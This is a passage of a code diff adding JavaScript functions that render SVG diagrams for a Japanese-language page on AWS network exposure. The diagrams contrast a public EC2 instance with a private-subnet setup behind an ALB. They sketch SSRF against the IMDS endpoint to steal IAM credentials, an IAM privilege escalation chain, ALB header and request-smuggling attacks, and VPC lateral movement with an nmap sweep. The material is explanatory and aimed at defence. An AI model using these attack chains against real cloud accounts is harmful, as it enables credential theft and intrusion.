+          <text x="345" y="78" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">EC2 (Public IP)</text>
+          <text x="345" y="93" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">22, 80 OPEN</text>
+
+          <line x1="120" y1="83" x2="170" y2="83" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+          <line x1="240" y1="83" x2="290" y2="83" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+          <text x="205" y="55" text-anchor="middle" font-size="9" fill="rgb(127 29 29)" font-family="JetBrains Mono, monospace">SYN</text>
+          <line x1="170" y1="93" x2="120" y2="93" stroke="rgb(245 158 11)" stroke-width="1.5" stroke-dasharray="3 3" marker-end="url(#arrow-amber)"/>
+          <text x="145" y="125" text-anchor="middle" font-size="9" fill="rgb(180 83 9)" font-family="JetBrains Mono, monospace">SYN-ACK ✓</text>
+
+          <rect x="20" y="170" width="380" height="60" rx="6" fill="rgb(254 242 242)" stroke="rgb(248 113 113)" stroke-width="1"/>
+          <text x="210" y="190" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">Result: Shodan/Censys にインデックス</text>
+          <text x="210" y="208" text-anchor="middle" font-size="10" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">21K+ shodan results/sec の攻撃対象群に</text>
+          <text x="210" y="222" text-anchor="middle" font-size="10" font-family="Inter, sans-serif" fill="rgb(127 29 29)">SSH brute-force / 0day scan の常時標的</text>
+
+          <!-- Config B boxes -->
+          <rect x="430" y="60" width="100" height="46" rx="6" fill="rgb(220 252 231)" stroke="rgb(5 150 105)" stroke-width="1.5"/>
+          <text x="480" y="80" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(6 78 59)" font-family="Inter, sans-serif">Attacker</text>
+          <text x="480" y="96" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(6 78 59)">masscan</text>
+
+          <rect x="570" y="60" width="70" height="46" rx="6" fill="rgb(241 245 249)" stroke="rgb(100 116 139)" stroke-width="1.5"/>
+          <text x="605" y="84" text-anchor="middle" font-size="11" font-weight="600" fill="rgb(30 41 59)" font-family="Inter, sans-serif">IGW</text>
+
+          <rect x="680" y="60" width="120" height="46" rx="6" fill="rgb(241 245 249)" stroke="rgb(100 116 139)" stroke-width="1.5" stroke-dasharray="4 3"/>
+          <text x="740" y="78" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(71 85 105)" font-family="Inter, sans-serif">Private Subnet</text>
+          <text x="740" y="93" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(71 85 105)">no IGW route</text>
+
+          <line x1="530" y1="83" x2="570" y2="83" stroke="rgb(16 185 129)" stroke-width="2" marker-end="url(#arrow-emerald)"/>
+          <line x1="640" y1="83" x2="675" y2="83" stroke="rgb(148 163 184)" stroke-width="2" stroke-dasharray="4 3"/>
+          <text x="660" y="76" text-anchor="middle" font-size="13" font-weight="700" fill="rgb(220 38 38)" font-family="Inter, sans-serif">×</text>
+
+          <rect x="430" y="170" width="370" height="60" rx="6" fill="rgb(236 253 245)" stroke="rgb(52 211 153)" stroke-width="1"/>
+          <text x="615" y="190" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(6 78 59)" font-family="Inter, sans-serif">Result: ホストが「存在しない」状態</text>
+          <text x="615" y="208" text-anchor="middle" font-size="10" font-family="JetBrains Mono, monospace" fill="rgb(6 78 59)">No SYN-ACK / No ICMP / Not in shodan</text>
+          <text x="615" y="222" text-anchor="middle" font-size="10" font-family="Inter, sans-serif" fill="rgb(6 78 59)">攻撃の起点 (target discovery) が消える</text>
+
+          <!-- Caption -->
+          <rect x="60" y="265" width="700" height="55" rx="8" fill="rgb(238 242 255)" stroke="rgb(99 102 241)" stroke-width="1.2"/>
+          <text x="410" y="285" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(67 56 202)" font-family="Inter, sans-serif">Layer 3 reachability の有無が攻撃の "起点" を左右する</text>
+          <text x="410" y="304" text-anchor="middle" font-size="10" fill="rgb(55 48 163)" font-family="Inter, sans-serif">SG はパケットを drop するが、 Private Subnet は そもそもパケットを 届かせない (route table の構造的な遮断)</text>
+        </svg>`;
+      }
+
+      function svgApplicationLayer() {
+        return `
+        <svg viewBox="0 0 820 380" role="img" aria-labelledby="svg-l2-title svg-l2-desc" class="w-full h-auto">
+          <title id="svg-l2-title">SSRF → IMDS → IAM 認証情報盗難の攻撃フロー</title>
+          <desc id="svg-l2-desc">/fetch endpoint に細工した URL を渡すと Flask プロセスが 169.254.169.254 を叩き、 IMDS の認証情報が攻撃者へ返る。 Config A / B どちらでも成立。</desc>
+
+          <!-- Step boxes (sequence-style) -->
+          <rect x="30" y="40" width="120" height="50" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="90" y="60" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">Attacker</text>
+          <text x="90" y="76" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">curl ?url=...</text>
+
+          <rect x="190" y="40" width="120" height="50" rx="6" fill="rgb(254 243 199)" stroke="rgb(217 119 6)" stroke-width="1.5"/>
+          <text x="250" y="60" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(120 53 15)" font-family="Inter, sans-serif">ALB / EC2 :80</text>
+          <text x="250" y="76" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(120 53 15)">HTTP GET /fetch</text>
+
+          <rect x="350" y="40" width="120" height="50" rx="6" fill="rgb(241 245 249)" stroke="rgb(100 116 139)" stroke-width="1.5"/>
+          <text x="410" y="60" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(30 41 59)" font-family="Inter, sans-serif">Flask process</text>
+          <text x="410" y="76" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(30 41 59)">requests.get(url)</text>
+
+          <rect x="510" y="40" width="140" height="50" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="580" y="58" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">IMDS</text>
+          <text x="580" y="74" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">169.254.169.254</text>
+          <text x="580" y="86" text-anchor="middle" font-size="8" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">v1 = optional</text>
+
+          <rect x="690" y="40" width="100" height="50" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="740" y="60" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">IAM creds</text>
+          <text x="740" y="76" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">AccessKey + Token</text>
+
+          <line x1="150" y1="65" x2="190" y2="65" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+          <line x1="310" y1="65" x2="350" y2="65" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+          <line x1="470" y1="65" x2="510" y2="65" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+          <line x1="650" y1="65" x2="690" y2="65" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+
+          <text x="170" y="32" text-anchor="middle" font-size="9" fill="rgb(127 29 29)" font-family="JetBrains Mono, monospace">①</text>
+          <text x="330" y="32" text-anchor="middle" font-size="9" fill="rgb(127 29 29)" font-family="JetBrains Mono, monospace">②</text>
+          <text x="490" y="32" text-anchor="middle" font-size="9" fill="rgb(127 29 29)" font-family="JetBrains Mono, monospace">③ link-local</text>
+          <text x="670" y="32" text-anchor="middle" font-size="9" fill="rgb(127 29 29)" font-family="JetBrains Mono, monospace">④</text>
+
+          <!-- Reverse arrow showing creds returned to attacker -->
+          <path d="M 740 95 Q 740 130 90 130 L 90 95" stroke="rgb(239 68 68)" stroke-width="2" stroke-dasharray="5 3" fill="none" marker-end="url(#arrow-red)"/>
+          <text x="410" y="148" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(127 29 29)" font-family="JetBrains Mono, monospace">⑤ Response: { AccessKeyId, SecretAccessKey, Token } → Attacker</text>
+
+          <!-- Note about 169.254 -->
+          <rect x="510" y="170" width="280" height="60" rx="6" fill="rgb(255 251 235)" stroke="rgb(245 158 11)" stroke-width="1.2"/>
+          <text x="650" y="190" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(120 53 15)" font-family="Inter, sans-serif">169.254.169.254 は VPC 境界の概念外</text>
+          <text x="650" y="207" text-anchor="middle" font-size="9" fill="rgb(120 53 15)" font-family="Inter, sans-serif">EC2 ローカル NIC からのみ応答</text>
+          <text x="650" y="221" text-anchor="middle" font-size="9" fill="rgb(120 53 15)" font-family="Inter, sans-serif">Flask プロセスは "EC2 ローカル" として動く</text>
+
+          <!-- Config A vs B comparison band -->
+          <rect x="30" y="260" width="370" height="100" rx="8" fill="rgb(254 242 242)" stroke="rgb(248 113 113)" stroke-width="1.2"/>
+          <text x="215" y="280" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">Config A: Internet → EC2 (Public) → IMDS</text>
+          <text x="215" y="298" text-anchor="middle" font-size="10" fill="rgb(127 29 29)" font-family="JetBrains Mono, monospace">入口=直接 / 中身=同じ / 結果=漏洩</text>
+          <line x1="50" y1="315" x2="380" y2="315" stroke="rgb(248 113 113)" stroke-width="1" stroke-dasharray="3 3"/>
+          <text x="215" y="335" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">Config B: Internet → ALB → EC2 (Private) → IMDS</text>
+          <text x="215" y="353" text-anchor="middle" font-size="10" fill="rgb(127 29 29)" font-family="JetBrains Mono, monospace">入口=ALB 経由 / 中身=同じ / 結果=漏洩</text>
+
+          <rect x="420" y="260" width="370" height="100" rx="8" fill="rgb(238 242 255)" stroke="rgb(99 102 241)" stroke-width="1.2"/>
+          <text x="605" y="280" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(67 56 202)" font-family="Inter, sans-serif">Key Insight</text>
+          <text x="605" y="300" text-anchor="middle" font-size="10" fill="rgb(55 48 163)" font-family="Inter, sans-serif">入口は違っても、 一度 EC2 内に到達すれば</text>
+          <text x="605" y="315" text-anchor="middle" font-size="10" fill="rgb(55 48 163)" font-family="Inter, sans-serif">SSRF → IMDS → IAM のメカニズムは完全に同一。</text>
+          <text x="605" y="335" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(67 56 202)" font-family="Inter, sans-serif">Private 配置はこの層で何の防御も提供しない。</text>
+        </svg>`;
+      }
+
+      function svgIamLayer() {
+        return `
+        <svg viewBox="0 0 820 410" role="img" aria-labelledby="svg-l3-title svg-l3-desc" class="w-full h-auto">
+          <title id="svg-l3-title">盗難 IAM 認証情報は VPC を完全にバイパスする</title>
+          <desc id="svg-l3-desc">通常時の AWS API 呼び出しは EC2 から VPC Endpoint や NAT GW 経由で発行されるが、 盗難認証情報は攻撃者の手元から直接 AWS Control Plane に届く。 VPC topology は IAM 認可と独立。</desc>
+
+          <!-- Top row: normal flow from EC2 -->
+          <text x="20" y="30" font-size="11" font-weight="700" fill="rgb(5 150 105)" font-family="Inter, sans-serif">通常時 (EC2 内のアプリが API 呼び出し)</text>
+          <rect x="20" y="50" width="130" height="46" rx="6" fill="rgb(220 252 231)" stroke="rgb(5 150 105)" stroke-width="1.5"/>
+          <text x="85" y="70" text-anchor="middle" font-size="11" font-weight="600" fill="rgb(6 78 59)" font-family="Inter, sans-serif">EC2 (Private)</text>
+          <text x="85" y="86" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(6 78 59)">app w/ role</text>
+
+          <rect x="180" y="50" width="160" height="46" rx="6" fill="rgb(241 245 249)" stroke="rgb(100 116 139)" stroke-width="1.5"/>
+          <text x="260" y="70" text-anchor="middle" font-size="10" font-weight="600" fill="rgb(30 41 59)" font-family="Inter, sans-serif">VPC Endpoint or</text>
+          <text x="260" y="86" text-anchor="middle" font-size="10" font-weight="600" fill="rgb(30 41 59)" font-family="Inter, sans-serif">NAT GW + IGW</text>
+
+          <rect x="370" y="50" width="160" height="46" rx="6" fill="rgb(241 245 249)" stroke="rgb(100 116 139)" stroke-width="1.5"/>
+          <text x="450" y="70" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(30 41 59)" font-family="Inter, sans-serif">AWS API endpoint</text>
+          <text x="450" y="86" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(30 41 59)">ec2.ap-northeast-1...</text>
+
+          <rect x="560" y="50" width="200" height="46" rx="6" fill="rgb(220 252 231)" stroke="rgb(5 150 105)" stroke-width="1.5"/>
+          <text x="660" y="70" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(6 78 59)" font-family="Inter, sans-serif">AWS Control Plane</text>
+          <text x="660" y="86" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(6 78 59)">IAM / STS / S3 / EC2</text>
+
+          <line x1="150" y1="73" x2="180" y2="73" stroke="rgb(16 185 129)" stroke-width="2" marker-end="url(#arrow-emerald)"/>
+          <line x1="340" y1="73" x2="370" y2="73" stroke="rgb(16 185 129)" stroke-width="2" marker-end="url(#arrow-emerald)"/>
+          <line x1="530" y1="73" x2="560" y2="73" stroke="rgb(16 185 129)" stroke-width="2" marker-end="url(#arrow-emerald)"/>
+
+          <!-- Divider -->
+          <line x1="20" y1="135" x2="800" y2="135" stroke="rgb(148 163 184)" stroke-width="1" stroke-dasharray="4 4"/>
+
+          <!-- Bottom row: stolen creds bypass VPC entirely -->
+          <text x="20" y="160" font-size="11" font-weight="700" fill="rgb(220 38 38)" font-family="Inter, sans-serif">認証情報盗難後 (攻撃者ラップトップから直撃)</text>
+
+          <rect x="20" y="180" width="160" height="46" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="100" y="200" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">Attacker laptop</text>
+          <text x="100" y="216" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">aws s3 ls ...</text>
+
+          <!-- Big "VPC bypassed" overlay -->
+          <rect x="220" y="180" width="220" height="46" rx="6" fill="rgb(241 245 249)" stroke="rgb(220 38 38)" stroke-width="2" stroke-dasharray="6 4"/>
+          <text x="330" y="200" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">EC2 / VPC を完全にバイパス</text>
+          <text x="330" y="216" text-anchor="middle" font-size="9" font-family="Inter, sans-serif" fill="rgb(127 29 29)">(経由しない、 関係ない)</text>
+          <line x1="220" y1="180" x2="440" y2="226" stroke="rgb(220 38 38)" stroke-width="1.5" />
+          <line x1="440" y1="180" x2="220" y2="226" stroke="rgb(220 38 38)" stroke-width="1.5" />
+
+          <rect x="480" y="180" width="160" height="46" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="560" y="200" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">AWS API endpoint</text>
+          <text x="560" y="216" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">公開エンドポイント</text>
+
+          <rect x="660" y="180" width="140" height="46" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="730" y="200" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">Control Plane</text>
+          <text x="730" y="216" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">S3 / EC2 / IAM</text>
+
+          <line x1="180" y1="203" x2="220" y2="203" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+          <line x1="440" y1="203" x2="480" y2="203" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+          <line x1="640" y1="203" x2="660" y2="203" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+
+          <!-- Privilege escalation chain -->
+          <rect x="20" y="260" width="780" height="55" rx="8" fill="rgb(254 242 242)" stroke="rgb(248 113 113)" stroke-width="1"/>
+          <text x="410" y="280" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">Privilege Escalation Chain (例)</text>
+          <text x="410" y="299" text-anchor="middle" font-size="10" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">stolen role → iam:ListUsers → iam:CreateAccessKey → iam:AttachUserPolicy → AdministratorAccess</text>
+
+          <!-- Caption -->
+          <rect x="20" y="335" width="780" height="65" rx="8" fill="rgb(238 242 255)" stroke="rgb(99 102 241)" stroke-width="1.2"/>
+          <text x="410" y="355" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(67 56 202)" font-family="Inter, sans-serif">AWS API エンドポイントはインターネット上の SaaS — IAM 認可は VPC topology に依存しない</text>
+          <text x="410" y="375" text-anchor="middle" font-size="10" fill="rgb(55 48 163)" font-family="Inter, sans-serif">対策は API 層側 (least-privilege / aws:SourceVpc / SCP / 短命 STS Session)</text>
+          <text x="410" y="392" text-anchor="middle" font-size="10" font-weight="600" fill="rgb(55 48 163)" font-family="Inter, sans-serif">Private 配置だけでは盗難認証情報の濫用を一切防げない</text>
+        </svg>`;
+      }
+
+      function svgAlbLayer() {
+        return `
+        <svg viewBox="0 0 820 320" role="img" aria-labelledby="svg-l4-title svg-l4-desc" class="w-full h-auto">
+          <title id="svg-l4-title">ALB 介在で生まれる新しい攻撃面 (Config B 固有)</title>
+          <desc id="svg-l4-desc">Host header injection / HTTP method override / request smuggling など、 ALB の L7 セマンティクス解釈差を利用する攻撃。</desc>
+
+          <!-- Normal flow -->
+          <text x="20" y="30" font-size="11" font-weight="700" fill="rgb(5 150 105)" font-family="Inter, sans-serif">通常リクエスト</text>
+          <rect x="20" y="45" width="100" height="44" rx="6" fill="rgb(220 252 231)" stroke="rgb(5 150 105)" stroke-width="1.5"/>
+          <text x="70" y="70" text-anchor="middle" font-size="11" font-weight="600" fill="rgb(6 78 59)" font-family="Inter, sans-serif">Client</text>
+          <rect x="160" y="45" width="120" height="44" rx="6" fill="rgb(254 243 199)" stroke="rgb(217 119 6)" stroke-width="1.5"/>
+          <text x="220" y="64" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(120 53 15)" font-family="Inter, sans-serif">ALB</text>
+          <text x="220" y="80" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(120 53 15)">L7 listener :80</text>
+          <rect x="320" y="45" width="120" height="44" rx="6" fill="rgb(241 245 249)" stroke="rgb(100 116 139)" stroke-width="1.5"/>
+          <text x="380" y="64" text-anchor="middle" font-size="10" font-weight="600" fill="rgb(30 41 59)" font-family="Inter, sans-serif">Target Group</text>
+          <text x="380" y="80" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(30 41 59)">routing rule</text>
+          <rect x="480" y="45" width="120" height="44" rx="6" fill="rgb(220 252 231)" stroke="rgb(5 150 105)" stroke-width="1.5"/>
+          <text x="540" y="70" text-anchor="middle" font-size="11" font-weight="600" fill="rgb(6 78 59)" font-family="Inter, sans-serif">EC2 (App)</text>
+          <line x1="120" y1="67" x2="160" y2="67" stroke="rgb(16 185 129)" stroke-width="2" marker-end="url(#arrow-emerald)"/>
+          <line x1="280" y1="67" x2="320" y2="67" stroke="rgb(16 185 129)" stroke-width="2" marker-end="url(#arrow-emerald)"/>
+          <line x1="440" y1="67" x2="480" y2="67" stroke="rgb(16 185 129)" stroke-width="2" marker-end="url(#arrow-emerald)"/>
+
+          <!-- Attack flow -->
+          <text x="20" y="125" font-size="11" font-weight="700" fill="rgb(220 38 38)" font-family="Inter, sans-serif">攻撃: 細工したヘッダで ALB の解釈を歪める</text>
+          <rect x="20" y="140" width="100" height="44" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="70" y="165" text-anchor="middle" font-size="11" font-weight="600" fill="rgb(127 29 29)" font-family="Inter, sans-serif">Attacker</text>
+          <rect x="160" y="140" width="200" height="44" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="260" y="158" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">ALB (L7 parsing surface)</text>
+          <text x="260" y="176" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">Host: / X-HTTP-Method-Override / TE</text>
+          <rect x="400" y="140" width="200" height="44" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="500" y="158" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">EC2 (App, 誤った host で routing)</text>
+          <text x="500" y="176" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">cache poison / auth bypass</text>
+
+          <line x1="120" y1="162" x2="160" y2="162" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+          <line x1="360" y1="162" x2="400" y2="162" stroke="rgb(239 68 68)" stroke-width="2" marker-end="url(#arrow-red)"/>
+
+          <!-- Intervention markers -->
+          <circle cx="220" cy="206" r="9" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="220" y="210" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(127 29 29)" font-family="JetBrains Mono, monospace">①</text>
+          <text x="245" y="210" font-size="10" fill="rgb(127 29 29)" font-family="Inter, sans-serif">host-based routing rule</text>
+
+          <circle cx="220" cy="232" r="9" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="220" y="236" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(127 29 29)" font-family="JetBrains Mono, monospace">②</text>
+          <text x="245" y="236" font-size="10" fill="rgb(127 29 29)" font-family="Inter, sans-serif">path-based routing rule</text>
+
+          <circle cx="500" cy="206" r="9" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="500" y="210" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(127 29 29)" font-family="JetBrains Mono, monospace">③</text>
+          <text x="525" y="210" font-size="10" fill="rgb(127 29 29)" font-family="Inter, sans-serif">method override</text>
+
+          <circle cx="500" cy="232" r="9" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="500" y="236" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(127 29 29)" font-family="JetBrains Mono, monospace">④</text>
+          <text x="525" y="236" font-size="10" fill="rgb(127 29 29)" font-family="Inter, sans-serif">CL.TE / TE.CL smuggling</text>
+
+          <!-- Caption -->
+          <rect x="20" y="265" width="780" height="50" rx="8" fill="rgb(255 251 235)" stroke="rgb(245 158 11)" stroke-width="1.2"/>
+          <text x="410" y="285" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(120 53 15)" font-family="Inter, sans-serif">ALB は L7 プロキシ = HTTP セマンティクス解釈に介入する場所が増える = 攻撃面も増える</text>
+          <text x="410" y="303" text-anchor="middle" font-size="10" fill="rgb(120 53 15)" font-family="Inter, sans-serif">Network 境界は縮小したが、 application protocol レベルでは新しい層が追加された (trade-off)</text>
+        </svg>`;
+      }
+
+      function svgVpcInternal() {
+        return `
+        <svg viewBox="0 0 820 320" role="img" aria-labelledby="svg-l5-title svg-l5-desc" class="w-full h-auto">
+          <title id="svg-l5-title">VPC 内部の Lateral Movement</title>
+          <desc id="svg-l5-desc">侵害された EC2 から内部スキャンや SG referenced rule 経由で同 VPC 内の他リソースに横展開する。</desc>
+
+          <!-- VPC outline -->
+          <rect x="20" y="30" width="780" height="220" rx="12" fill="rgb(248 250 252)" stroke="rgb(99 102 241)" stroke-width="1.5" stroke-dasharray="6 4"/>
+          <text x="40" y="55" font-size="11" font-weight="700" fill="rgb(67 56 202)" font-family="Inter, sans-serif">VPC 10.0.0.0/16</text>
+
+          <!-- Compromised EC2 -->
+          <rect x="50" y="90" width="160" height="60" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="2"/>
+          <text x="130" y="112" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">Compromised EC2</text>
+          <text x="130" y="128" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">10.0.10.5 (SSRF)</text>
+          <text x="130" y="142" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">nmap -sn 10.0.0.0/16</text>
+
+          <!-- Other resources -->
+          <rect x="280" y="75" width="120" height="40" rx="6" fill="rgb(255 251 235)" stroke="rgb(245 158 11)" stroke-width="1.5"/>
+          <text x="340" y="92" text-anchor="middle" font-size="10" font-weight="600" fill="rgb(120 53 15)" font-family="Inter, sans-serif">Other EC2</text>
+          <text x="340" y="106" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(120 53 15)">10.0.10.6</text>
+
+          <rect x="280" y="125" width="120" height="40" rx="6" fill="rgb(255 251 235)" stroke="rgb(245 158 11)" stroke-width="1.5"/>
+          <text x="340" y="142" text-anchor="middle" font-size="10" font-weight="600" fill="rgb(120 53 15)" font-family="Inter, sans-serif">RDS / Aurora</text>
+          <text x="340" y="156" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(120 53 15)">5432 from app-sg</text>
+
+          <rect x="280" y="175" width="120" height="40" rx="6" fill="rgb(255 251 235)" stroke="rgb(245 158 11)" stroke-width="1.5"/>
+          <text x="340" y="192" text-anchor="middle" font-size="10" font-weight="600" fill="rgb(120 53 15)" font-family="Inter, sans-serif">ElastiCache</text>
+          <text x="340" y="206" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(120 53 15)">6379 in-VPC</text>
+
+          <rect x="450" y="75" width="140" height="40" rx="6" fill="rgb(255 251 235)" stroke="rgb(245 158 11)" stroke-width="1.5"/>
+          <text x="520" y="92" text-anchor="middle" font-size="10" font-weight="600" fill="rgb(120 53 15)" font-family="Inter, sans-serif">Internal ALB</text>
+          <text x="520" y="106" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(120 53 15)">internal-only :80</text>
+
+          <rect x="450" y="125" width="140" height="40" rx="6" fill="rgb(255 251 235)" stroke="rgb(245 158 11)" stroke-width="1.5"/>
+          <text x="520" y="142" text-anchor="middle" font-size="10" font-weight="600" fill="rgb(120 53 15)" font-family="Inter, sans-serif">Service Discovery</text>
+          <text x="520" y="156" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(120 53 15)">*.cluster.local</text>
+
+          <rect x="450" y="175" width="140" height="40" rx="6" fill="rgb(255 251 235)" stroke="rgb(245 158 11)" stroke-width="1.5"/>
+          <text x="520" y="192" text-anchor="middle" font-size="10" font-weight="600" fill="rgb(120 53 15)" font-family="Inter, sans-serif">Admin EC2</text>
+          <text x="520" y="206" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(120 53 15)">10.0.20.10</text>
+
+          <!-- Lateral movement arrows -->
+          <line x1="210" y1="105" x2="280" y2="95" stroke="rgb(239 68 68)" stroke-width="1.8" marker-end="url(#arrow-red)"/>
+          <line x1="210" y1="120" x2="280" y2="145" stroke="rgb(239 68 68)" stroke-width="1.8" marker-end="url(#arrow-red)"/>
+          <line x1="210" y1="135" x2="280" y2="195" stroke="rgb(239 68 68)" stroke-width="1.8" marker-end="url(#arrow-red)"/>
+          <line x1="400" y1="95" x2="450" y2="95" stroke="rgb(239 68 68)" stroke-width="1.8" marker-end="url(#arrow-red)"/>
+          <line x1="400" y1="145" x2="450" y2="145" stroke="rgb(239 68 68)" stroke-width="1.8" marker-end="url(#arrow-red)"/>
+          <line x1="400" y1="195" x2="450" y2="195" stroke="rgb(239 68 68)" stroke-width="1.8" marker-end="url(#arrow-red)"/>
+
+          <!-- SG referenced label -->
+          <rect x="620" y="100" width="160" height="115" rx="8" fill="rgb(238 242 255)" stroke="rgb(99 102 241)" stroke-width="1.2"/>
+          <text x="700" y="120" text-anchor="middle" font-size="10" font-weight="700" fill="rgb(67 56 202)" font-family="Inter, sans-serif">SG referenced rule</text>
+          <text x="700" y="138" text-anchor="middle" font-size="9" fill="rgb(55 48 163)" font-family="JetBrains Mono, monospace">app-sg ↔ db-sg</text>
+          <text x="700" y="155" text-anchor="middle" font-size="9" fill="rgb(55 48 163)" font-family="Inter, sans-serif">が広いほど</text>
+          <text x="700" y="170" text-anchor="middle" font-size="9" fill="rgb(55 48 163)" font-family="Inter, sans-serif">侵害 1 台で</text>
+          <text x="700" y="185" text-anchor="middle" font-size="9" fill="rgb(55 48 163)" font-family="Inter, sans-serif">VPC 全体に拡散</text>
+          <text x="700" y="205" text-anchor="middle" font-size="9" font-weight="700" fill="rgb(67 56 202)" font-family="Inter, sans-serif">(両 Config 同条件)</text>
+
+          <!-- Caption -->
+          <rect x="20" y="265" width="780" height="50" rx="8" fill="rgb(254 242 242)" stroke="rgb(248 113 113)" stroke-width="1.2"/>
